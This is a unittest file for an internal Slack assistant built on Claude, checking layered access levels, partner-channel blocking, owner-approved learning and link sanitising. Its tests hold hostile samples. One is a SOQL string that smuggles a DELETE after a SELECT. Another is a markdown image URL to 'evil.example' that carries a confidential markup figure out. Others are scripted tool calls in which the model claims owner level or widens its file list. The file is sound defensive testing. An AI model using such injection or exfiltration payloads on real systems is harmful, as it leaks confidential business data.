"""Offline tests: no Slack, Salesforce, Google or Claude calls. Run: python -m unittest test_brain"""
import os
import tempfile
import unittest
from unittest import mock
from pathlib import Path
from types import SimpleNamespace as NS

import access
import brain
import tools


class FakeClaude:
    """Replays scripted responses and records every request."""

    def __init__(self, script):
        self.script, self.calls = list(script), []
        self.messages = self

    def create(self, **kw):
        self.calls.append(kw)
        return self.script.pop(0)


def text(t):
    return NS(content=[NS(type="text", text=t)], stop_reason="end_turn")


def tool_call(name, args, tid="t1"):
    return NS(content=[NS(type="tool_use", id=tid, name=name, input=args, model_dump=lambda: {"type": "tool_use", "id": tid, "name": name, "input": args})],
              stop_reason="tool_use")


LAYERS = {"default_level": "team", "people": {"UOWNER": {"level": "owner"}},
          "levels": {"owner": {"sees": ["owner", "team"], "tools": ["fake", "learn", "sheets_read"]},
                     "team": {"sees": ["team"], "tools": ["sheets_read"]}}}


def make_brain(script, tool_map):
    b = brain.Brain(client=FakeClaude(script), tools=tool_map)
    b.layers = LAYERS
    return b


def setUpModule():
    # The owner level comes only from the BRAIN_OWNER_SLACK_ID secret.
    global _env
    _env = mock.patch.dict(os.environ, {"BRAIN_OWNER_SLACK_ID": "UOWNER"})
    _env.start()


def tearDownModule():
    _env.stop()


class SoqlGuard(unittest.TestCase):
    def test_only_select(self):
        for bad in ["DELETE FROM Account", "update Account set Name='x'", "SELECT Id FROM Account; DELETE FROM Account",
                    "SELECT Id FROM Account WHERE Name='delete'", "  "]:
            with self.assertRaises(ValueError, msg=bad):
                tools.check_soql(bad)

    def test_limit(self):
        self.assertTrue(tools.check_soql("SELECT Id FROM Account").endswith("LIMIT 200"))
        self.assertTrue(tools.check_soql("SELECT Id FROM Account LIMIT 5000").endswith("LIMIT 200"))
        self.assertTrue(tools.check_soql("SELECT Id FROM Account LIMIT 10").endswith("LIMIT 10"))


class SheetGuard(unittest.TestCase):
    def test_allowlist_and_audience(self):
        allow = {"tickets": {"id": "x", "audience": "team"}, "targets": {"id": "y"}}
        with self.assertRaises(ValueError):
            tools.sheets_read("random", None, allow, "owner")
        with self.assertRaisesRegex(ValueError, "restricted"):
            tools.sheets_read("targets", None, allow, "team")


class ToolLoop(unittest.TestCase):
    def test_tool_result_flows_back(self):
        seen = {}
        tmap = {"fake": {"schema": {"name": "fake"}, "fn": lambda q: seen.setdefault("q", q) and "ARR 5000"}}
        b = make_brain([tool_call("fake", {"q": "F5 123"}), text("ARR is 5000 (Salesforce)")], tmap)
        self.assertEqual(b.ask("arr?", "UOWNER"), "ARR is 5000 (Salesforce)")
        self.assertEqual(seen["q"], "F5 123")
        last = b.client.calls[1]["messages"][-1]["content"][0]
        self.assertEqual(last["content"], "ARR 5000")
        self.assertFalse(last["is_error"])

    def test_team_cannot_use_owner_tools_even_if_model_asks(self):
        called = []
        tmap = {"fake": {"schema": {"name": "fake"}, "fn": lambda **k: called.append(1) or "secret"},
                "sheets_read": {"schema": {"name": "sheets_read"}, "fn": lambda **k: "ok"}}
        b = make_brain([tool_call("fake", {}), text("restricted")], tmap)
        b.ask("cost price?", "USOMEONE")
        self.assertEqual(called, [])
        self.assertEqual([t["name"] for t in b.client.calls[0]["tools"]], ["sheets_read"])
        self.assertTrue(b.client.calls[1]["messages"][-1]["content"][0]["is_error"])

    def test_team_prompt_has_no_owner_knowledge(self):
        b = make_brain([text("x")], {})
        b.ask("hi", "USOMEONE")
        sys = b.client.calls[0]["system"][0]["text"]
        self.assertNotIn("COST-TABLE-ROW", sys)
        self.assertNotIn("TARGET-NUMBER", sys)

    def test_level_injected_for_level_aware_tools(self):
        got = {}
        tmap = {"sheets_read": {"schema": {"name": "sheets_read"}, "level_aware": True,
                                "fn": lambda sheet, _level="team": got.setdefault("lvl", _level) and "rows"}}
        b = make_brain([tool_call("sheets_read", {"sheet": "tickets", "_level": "owner"}), text("done")], tmap)
        b.ask("tickets?", "USOMEONE")
        self.assertEqual(got["lvl"], "team", "the model must not be able to claim a higher level")

    def test_tool_error_is_reported_not_raised(self):
        def boom(**k):
            raise RuntimeError("salesforce down")
        b = make_brain([tool_call("fake", {}), text("Salesforce is down right now.")], {"fake": {"schema": {"name": "fake"}, "fn": boom}})
        self.assertEqual(b.ask("arr?", "UOWNER"), "Salesforce is down right now.")
        self.assertIn("salesforce down", b.client.calls[1]["messages"][-1]["content"][0]["content"])

    def test_loop_is_bounded(self):
        script = [tool_call("fake", {}) for _ in range(brain.MAX_TOOL_TURNS + 1)]
        b = make_brain(script, {"fake": {"schema": {"name": "fake"}, "fn": lambda **k: "again"}})
        self.assertIn("too many lookups", b.ask("loop", "UOWNER"))


def pid_of(msg):
    return msg.split("#")[1].split(" ")[0]


class Learning(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        root = Path(self.tmp.name)
        self.knowledge, self.private = root / "knowledge", root / "private"
        self.knowledge.mkdir(), self.private.mkdir()
        self.lr = tools.Learner(self.knowledge, self.private / "q.json", owner_file=self.private / "learned_owner.md")

    def tearDown(self):
        self.tmp.cleanup()

    def test_nothing_saved_without_approval_and_team_only_by_explicit_command(self):
        msg = self.lr.propose("White glove grace is now 60 days")
        self.assertIn("owner only", msg)
        self.assertIn("60 days", msg, "Kareem must see the fact before approving it")
        self.assertEqual(list(self.knowledge.glob("*.md")), [])
        self.assertIn("team", self.lr.approve(pid_of(msg), "team"))
        saved = (self.knowledge / "10-learned-team.md").read_text()
        self.assertIn("60 days", saved)
        self.assertIn("audience: team", saved)
        self.assertIn("No pending", self.lr.approve(pid_of(msg)))

    def test_plain_approve_keeps_the_fact_owner_only_and_out_of_knowledge(self):
        msg = self.lr.propose("Grubtech markup is now 25%")
        self.assertIn("only you", self.lr.approve(pid_of(msg)))
        self.assertEqual(list(self.knowledge.glob("*")), [], "owner facts must never be written into knowledge/")
        self.assertIn("25%", (self.private / "learned_owner.md").read_text())

    def test_owner_learned_file_loads_as_owner_only(self):
        f = self.private / "learned_owner.md"
        f.write_text("# Learned\n- markup 25%\n", encoding="utf-8")
        docs = brain.owner_docs_from_file(f)
        self.assertEqual([(d.id, d.audience) for d in docs], [("learned-owner", "owner")])

    def test_the_model_cannot_choose_the_audience(self):
        schema = tools.build_tools(slack=None, learner=self.lr, sources={})["learn"]["schema"]["input_schema"]
        self.assertEqual(list(schema["properties"]), ["fact"])


class FileParsing(unittest.TestCase):
    def test_csv_and_xlsx(self):
        self.assertIn("a,b", tools.parse_bytes("x.csv", b"a,b\n1,2"))
        import io
        from openpyxl import Workbook
        wb = Workbook(); wb.active.append(["Partner", "ARR"]); wb.active.append(["Deliverect", 100])
        buf = io.BytesIO(); wb.save(buf)
        self.assertIn("Deliverect | 100", tools.parse_bytes("x.xlsx", buf.getvalue()))
        self.assertIn("Cannot read", tools.parse_bytes("x.exe", b""))



class PartnerSpaceTest(unittest.TestCase):
    """The bot must never answer where a partner can read the reply or is the one asking."""

    def gate(self, **kw):
        base = dict(channel_name=None, is_shared=False, is_im=False, user_team="T1", workspace_team="T1", layers={})
        base.update(kw)
        return brain.partner_space(**base)

    def test_partner_country_and_shared_channels_are_blocked(self):
        for name in ["ksa-grubtech", "uae-deliverect", "egypt-urbanpiper", "kw-jo-grubtech", "foodics-urbanpiper"]:
            self.assertTrue(self.gate(channel_name=name), name)

    def test_slack_connect_channels_and_external_users_are_blocked(self):
        self.assertTrue(self.gate(channel_name="reselling-team", is_shared=True))
        self.assertTrue(self.gate(is_im=True, user_team="T_PARTNER"))

    def test_internal_channels_and_dms_are_allowed(self):
        self.assertFalse(self.gate(channel_name="reseller-hub"))
        self.assertFalse(self.gate(is_im=True))

    def test_allowed_channels_override_a_pattern(self):
        self.assertFalse(self.gate(channel_name="ksa-reselling-internal", layers={"allowed_channels": ["ksa-reselling-internal"]}))


class CatalogTest(unittest.TestCase):
    def setUp(self):
        self.cat = tools.Catalog()

    def test_partner_price_in_country_currency(self):
        out = __import__("json").loads(self.cat.lookup(partner="grubtech", country="SA"))
        line = next(l for l in out["line_items"] if l["name"] == "Grubtech - gOnline License [Annual]")
        self.assertEqual((line["price"], line["currency"]), (1421.1, "SAR"))

    def test_category_side_by_side(self):
        out = __import__("json").loads(self.cat.lookup(category="inventory", country="SA"))
        self.assertEqual([p["partner"] for p in out["partners"]], ["ShopBrain", "Supy"])

    def test_unknown_partner_is_not_invented(self):
        self.assertIn("not in the reseller catalogue", self.cat.lookup(partner="Acme Delivery"))

    def test_catalogue_never_holds_cost_or_margin(self):
        text = (tools.CATALOG_DIR / "catalog.json").read_text(encoding="utf-8").lower()
        for word in ['"cost"', '"margin"', '"markup"', '"wholesale"']:
            self.assertNotIn(word, text)

    def test_catalogue_tool_is_registered_without_credentials(self):
        self.assertIn("brain_catalog", tools.build_tools(slack=None, learner=None, sources={}))


class RealLayersTest(unittest.TestCase):
    """Kareem's layers (14 Nov 2026), checked against the real layers.yaml and knowledge files."""

    @classmethod
    def setUpClass(cls):
        import base64, json, os
        cls.layers = brain.load_layers()
        # Owner files are not in the repo; simulate the BRAIN_OWNER_KNOWLEDGE_B64 secret.
        fake = [{"id": "partner-contacts-and-trackers", "audience": "team", "body": "Partner X: CONTACT-NAME. TRACKER-NAME tracker. Partner Y CONTRACT-STATUS."},
                {"id": "pricing", "body": "| COST-TABLE-ROW |"}]
        os.environ["BRAIN_OWNER_KNOWLEDGE_B64"] = base64.b64encode(json.dumps(fake).encode()).decode()
        try:
            cls.docs = brain.load_docs()
        finally:
            del os.environ["BRAIN_OWNER_KNOWLEDGE_B64"]

    def test_owner_docs_from_the_secret_are_always_owner_only(self):
        ids = {d.id: d.audience for d in self.docs if d.id in ("partner-contacts-and-trackers", "pricing")}
        self.assertEqual(ids, {"partner-contacts-and-trackers": "owner", "pricing": "owner"})

    def test_repo_knowledge_has_no_owner_files(self):
        self.assertFalse([d.id for d in brain.load_docs(private=False) if d.audience == "owner"])

    def prompt(self, level):
        return brain.system_prompt(level, self.layers, self.docs)

    def test_named_people_get_their_level(self):
        self.assertEqual(brain.level_for("U08DW8E5WKW", self.layers, owner_id="U08DW8E5WKW"), "owner")
        self.assertEqual(brain.level_for("U0BQKNQNF89", self.layers, owner_id="U08DW8E5WKW"), "team")
        self.assertEqual(brain.level_for("U02VD9VGNA0", self.layers, owner_id="U08DW8E5WKW"), "team")

    def test_owner_comes_from_the_secret_not_from_the_shared_repo(self):
        self.assertEqual(brain.level_for("U08DW8E5WKW", self.layers, owner_id=""), "sales")
        self.assertEqual(brain.level_for("U08DW8E5WKW", self.layers, owner_id="U_OTHER"), "sales")
        self.assertEqual(brain.level_for("U_SANDBOX", self.layers, owner_id="U_SANDBOX"), "owner")
        evil = {"default_level": "owner", "people": {}}
        self.assertEqual(brain.level_for("U_ANYONE", evil, owner_id="U08DW8E5WKW"), "sales")

    def test_owner_docs_never_reach_other_levels_even_if_layers_say_so(self):
        evil = {"levels": {"team": {"sees": ["owner", "team"]}}}
        self.assertFalse([d for d in brain.visible_docs("team", evil, self.docs) if d.audience == "owner"])

    def test_anyone_not_listed_is_sales(self):
        self.assertEqual(brain.level_for("U_SOMEONE_NEW", self.layers), "sales")

    def test_sales_sees_only_the_sales_scope(self):
        ids = [d.id for d in brain.visible_docs("sales", self.layers, self.docs)]
        self.assertEqual(ids, ["sales-scope"])
        p = self.prompt("sales")
        for secret in ["30 days of the invoice date", "Diamond", "CONTACT-NAME", "COST-TABLE-ROW", "TRACKER-NAME", "CONTRACT-STATUS"]:
            self.assertNotIn(secret, p, secret)

    def test_sales_gets_only_the_catalogue_tool(self):
        allowed = brain.tools_for("sales", self.layers, {"brain_catalog": {}, "sheets_read": {}, "slack_read_channel": {}, "learn": {}})
        self.assertEqual(list(allowed), ["brain_catalog"])

    def test_team_has_no_contacts_trackers_or_contract_status(self):
        ids = {d.id for d in brain.visible_docs("team", self.layers, self.docs)}
        self.assertNotIn("partner-contacts-and-trackers", ids)
        self.assertNotIn("sales-scope", ids)
        p = self.prompt("team")
        for secret in ["CONTACT-NAME", "TRACKER-NAME", "CONTRACT-STATUS", "CONTRACT-STATUS", "COST-TABLE-ROW"]:
            self.assertNotIn(secret, p, secret)
        self.assertIn("30 days of the invoice date", p)

    def test_owner_sees_contacts_but_not_the_sales_restrictions(self):
        ids = {d.id for d in brain.visible_docs("owner", self.layers, self.docs)}
        self.assertIn("partner-contacts-and-trackers", ids)
        self.assertNotIn("sales-scope", ids)

    def test_sales_catalogue_is_limited_to_prices_resellers_and_structure(self):
        import json
        cat = tools.Catalog()
        out = json.loads(cat.lookup(partner="Grubtech", country="SA", level="sales"))
        for hidden in ["best_for", "edge", "watch_out", "submission_form", "ksa_approval_form", "slack"]:
            self.assertNotIn(hidden, out, hidden)
        self.assertIn("quote_rules", out)
        self.assertTrue(any(l.get("price") == 1421.1 for l in out["line_items"]))
        comp = json.loads(cat.lookup(category="opm", country="SA", level="sales"))
        self.assertNotIn("how_to_choose", comp)
        self.assertTrue(all("edge" not in r and "watch_out" not in r for r in comp["partners"]))
        full = json.loads(cat.lookup(partner="Grubtech", country="SA", level="team"))
        self.assertIn("watch_out", full)

    def test_sales_never_sees_discount_rules(self):
        cat = tools.Catalog()
        for p in cat.partners:
            out = cat.lookup(partner=p, country="SA", level="sales")
            rules = __import__("json").loads(out)["quote_rules"]
            self.assertFalse([r for r in rules if "discount" in r.lower()], p)
        self.assertIn("can't be discounted", cat.lookup(partner="InvoiceQ", level="team"))


# ---------- who reads the reply ----------
T = "TFOODICS"
MEMBER = {"team_id": T}


class FakeDirectory:
    def __init__(self, users, channels=None, members=None, fail=()):
        self.users, self.channels, self.member_map, self.fail = users, channels or {}, members or {}, set(fail)

    def user(self, uid):
        if "user" in self.fail:
            raise RuntimeError("missing_scope")
        if uid not in self.users:
            raise RuntimeError("user_not_found")
        return self.users[uid]

    def channel(self, cid):
        if "channel" in self.fail:
            raise RuntimeError("channel_not_found")
        return self.channels[cid]

    def members(self, cid):
        return self.member_map[cid]


PEOPLE = {"UK": "owner", "UH": "team", "UA": "team"}
USERS = {"UK": MEMBER, "UH": MEMBER, "UA": MEMBER, "US": MEMBER, "UBOT": {**MEMBER, "is_bot": True},
         "UGUEST": {**MEMBER, "is_restricted": True}, "USINGLE": {**MEMBER, "is_ultra_restricted": True},
         "UEXT": {"team_id": "TGRUBTECH"}, "USTRANGER": {"team_id": T, "is_stranger": True}}


def decide(user, channel="D1", channel_type="im", **dir_kw):
    d = FakeDirectory(dict(USERS), **dir_kw)
    return access.decide(event={"user": user, "channel": channel, "channel_type": channel_type}, directory=d,
                         workspace_team=T, level_of=lambda u: PEOPLE.get(u, "sales"),
                         name_blocked=lambda n: brain.partner_space(channel_name=n, is_shared=False, is_im=False,
                                                                    user_team=None, workspace_team=None, layers={}))


class AccessTest(unittest.TestCase):
    def test_partners_and_outsiders_get_nothing_not_even_a_refusal(self):
        for u in ["UGUEST", "USINGLE", "UEXT", "USTRANGER", "UBOT", "U_UNKNOWN"]:
            d = decide(u)
            self.assertFalse(d.answer, u)
            self.assertIsNone(d.notice, u)

    def test_lookup_failure_fails_closed(self):
        self.assertFalse(decide("UK", fail={"user"}).answer)

    def test_dm_is_at_the_askers_own_level(self):
        self.assertEqual((decide("UK").level, decide("UK").where), ("owner", "dm"))
        self.assertEqual(decide("UH").level, "team")
        self.assertEqual(decide("US").level, "sales")

    def test_channel_reply_is_for_the_least_privileged_member(self):
        ch = {"C1": {"name": "reseller-hub"}}
        d = decide("UK", "C1", "channel", channels=ch, members={"C1": ["UK", "UH", "US", "UBOT"]})
        self.assertEqual((d.answer, d.level, d.where), (True, "sales", "channel"))

    def test_owner_answers_never_leave_the_dm(self):
        ch = {"C2": {"name": "partnerships-leads", "is_private": True}}
        self.assertEqual(decide("UK", "C2", "channel", channels=ch, members={"C2": ["UK"]}).level, "team")
        self.assertEqual(decide("UK", "C2", "channel", channels=ch, members={"C2": ["UK", "UH", "UA", "UBOT"]}).level, "team")

    def test_a_guest_or_outside_member_blocks_the_channel_whatever_its_name(self):
        for m in ["UGUEST", "USINGLE", "UEXT", "U_UNKNOWN"]:
            ch = {"C3": {"name": "grubtech-onboarding"}}
            d = decide("UK", "C3", "channel", channels=ch, members={"C3": ["UK", m]})
            self.assertFalse(d.answer, m)
            self.assertIn(d.notice, (access.PARTNER_SPACE_REPLY, access.CANNOT_CHECK_REPLY))

    def test_shared_pending_and_partner_named_channels_are_blocked(self):
        for ch in [{"name": "x", "is_ext_shared": True}, {"name": "x", "is_shared": True},
                   {"name": "x", "is_pending_ext_shared": True}, {"name": "x", "pending_shared": ["TGRUBTECH"]},
                   {"name": "ksa-grubtech"}, {"name": "foodics-urbanpiper"}, {"name": "g", "is_mpim": True}]:
            d = decide("UK", "C4", "channel", channels={"C4": ch}, members={"C4": ["UK"]})
            self.assertFalse(d.answer, ch)

    def test_channel_check_failure_fails_closed(self):
        d = decide("UK", "C5", "channel", fail={"channel"})
        self.assertFalse(d.answer)
        self.assertEqual(d.notice, access.CANNOT_CHECK_REPLY)

    def test_a_dm_needs_a_D_channel(self):
        ch = {"C6": {"name": "reseller-hub"}}
        d = decide("UK", "C6", "im", channels=ch, members={"C6": ["UK", "US"]})
        self.assertEqual((d.where, d.level), ("channel", "sales"))

    def test_owner_commands(self):
        for c in ["reload", "pending", "approve abc123", "Approve #abc123 team", "reject abc123"]:
            self.assertTrue(access.is_owner_command(c), c)
        for c in ["approve the deal", "what is pending for grubtech?"]:
            self.assertFalse(access.is_owner_command(c), c)

    def test_directory_caches_and_fails_closed_on_missing_scope(self):
        class Client:
            calls = 0
            def users_list(self, **k):
                Client.calls += 1
                return {"members": [{"id": "UK", "team_id": T}], "response_metadata": {"next_cursor": ""}}
            def users_info(self, user):
                raise RuntimeError("user_not_found")
        now = [0.0]
        d = access.Directory(Client(), clock=lambda: now[0])
        self.assertEqual(d.user("UK")["team_id"], T)
        d.user("UK")
        self.assertEqual(Client.calls, 1)
        with self.assertRaises(RuntimeError):
            d.user("UNKNOWN")


class LevelCapTest(unittest.TestCase):
    LAYERS = {"default_level": "sales", "people": {"UH": {"level": "team"}},
              "levels": {"owner": {"sees": ["owner", "team"], "tools": ["fake", "brain_catalog"]},
                         "team": {"sees": ["team"], "tools": ["brain_catalog"]},
                         "sales": {"sees": ["sales"], "tools": ["brain_catalog"]}}}
    DOCS = [brain.Doc("pricing", "owner", "MARKUP-30"), brain.Doc("policy", "team", "BAND-10"),
            brain.Doc("sales-scope", "sales", "ONLY-THREE")]

    def ask(self, user, **kw):
        tmap = {"fake": {"schema": {"name": "fake"}, "fn": lambda **k: "x"},
                "brain_catalog": {"schema": {"name": "brain_catalog"}, "fn": lambda **k: "x"}}
        b = brain.Brain(client=FakeClaude([text("ok")]), tools=tmap)
        b.layers, b.docs = self.LAYERS, self.DOCS
        with mock.patch.dict(os.environ, {"BRAIN_OWNER_SLACK_ID": "UK"}):
            b.ask("q", user, **kw)
        call = b.client.calls[0]
        return call["system"][0]["text"], [t["name"] for t in call.get("tools", [])]

    def test_owner_in_a_channel_gets_a_sales_answer(self):
        sys, tools_ = self.ask("UK", level="sales", where="channel")
        self.assertNotIn("MARKUP-30", sys)
        self.assertNotIn("BAND-10", sys)
        self.assertIn("ONLY-THREE", sys)
        self.assertEqual(tools_, ["brain_catalog"])
        self.assertIn("other people can read", sys)
        self.assertIn("only share that in a DM", sys)

    def test_a_cap_can_never_raise_the_level(self):
        sys, tools_ = self.ask("UH", level="owner")
        self.assertNotIn("MARKUP-30", sys)
        self.assertEqual(tools_, ["brain_catalog"])
        sys, _ = self.ask("U_NEW", level="team")
        self.assertNotIn("BAND-10", sys)

    def test_owner_dm_is_full(self):
        sys, tools_ = self.ask("UK")
        self.assertIn("MARKUP-30", sys)
        self.assertIn("fake", tools_)


class SlackReadLimits(unittest.TestCase):
    def test_files_only_from_the_current_message(self):
        r = tools.SlackReader(client=None, token="x")
        for allowed in [None, [], ["F2"]]:
            with self.assertRaisesRegex(ValueError, "attached to this message"):
                r.read_file("F1", allowed)

    def test_the_model_cannot_widen_the_file_list(self):
        got = {}
        tmap = {"read_slack_file": {"schema": {"name": "read_slack_file"}, "ctx_aware": True,
                                    "fn": lambda file_id, _ctx=None: got.setdefault("ctx", _ctx) and "ok"}}
        b = make_brain([tool_call("read_slack_file", {"file_id": "F9", "_ctx": {"file_ids": ["F9"]}}), text("done")], tmap)
        b.layers = {"levels": {"team": {"sees": ["team"], "tools": ["read_slack_file"]}}, "default_level": "team"}
        b.ask("read it", "UH", ctx={"file_ids": ["F1"]})
        self.assertEqual(got["ctx"], {"file_ids": ["F1"]})

    def test_dms_cannot_be_read(self):
        class Client:
            def conversations_info(self, channel):
                return {"channel": {"is_im": True}}
        r = tools.SlackReader(client=Client(), token="x")
        for cid in ["D0123456789", "C0123456789"]:
            with self.assertRaisesRegex(ValueError, "Direct messages"):
                r.channel_id(cid)

    def test_team_cannot_read_slack_channels(self):
        layers = brain.load_layers()
        self.assertNotIn("slack_read_channel", layers["levels"]["team"]["tools"])


class ReplySafety(unittest.TestCase):
    def test_unknown_links_and_channel_pings_are_removed(self):
        hosts = brain.link_hosts(["see https://share.hsforms.com/abc"])
        out = brain.safe_reply("Form: https://share.hsforms.com/abc ![x](https://evil.example/p.png?d=markup30) "
                               "<https://evil.example/x|click> https://foodics.lightning.force.com/r/1 <!channel> <!here|here>", hosts)
        self.assertNotIn("evil.example", out)
        self.assertIn("https://share.hsforms.com/abc", out)
        self.assertIn("https://foodics.lightning.force.com/r/1", out)
        self.assertNotIn("<!channel>", out)
        self.assertNotIn("<!here", out)

    def test_lookalike_hosts_are_removed(self):
        out = brain.safe_reply("https://foodics.com.evil.example/x https://evilfoodics.com/x", set(brain.DEFAULT_LINK_HOSTS))
        self.assertEqual(out.count("[link removed]"), 2)


if __name__ == "__main__":
    unittest.main()
